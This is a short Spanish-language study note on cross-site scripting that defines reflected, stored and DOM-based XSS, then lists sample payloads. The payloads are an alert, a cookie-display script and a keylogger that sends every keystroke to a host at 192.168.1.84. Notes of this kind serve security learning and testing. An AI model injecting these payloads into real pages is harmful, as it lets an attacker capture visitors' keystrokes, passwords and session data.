___
- tags: #owasp #xss 
___
Es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento.
## Tipos de XSS
### Reflejado (Reflected)
Cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente.
### Almacenado (Stored)
Este tipo de XSS se produce cuando un atacante **es capaz** de almacenar código malicioso en una base de datos o en el servidor web que aloja una página web vulnerable.
### DOM-Based
Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento).
Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.


## Scripts de ejemplo
### Alert
```html
<script>alert("pwned")</script>
```
### Keylogger
```html
<script>
var k = "";
document.onkeypress = function (e){
	e = e || window.event;
	k += e.key;
	var i = new Image();
	i.src = "http://192.168.1.84/?k=" + k;
 };
</script>
```
### Cookie
```html
<script>alert(document.cookie)</script>
```

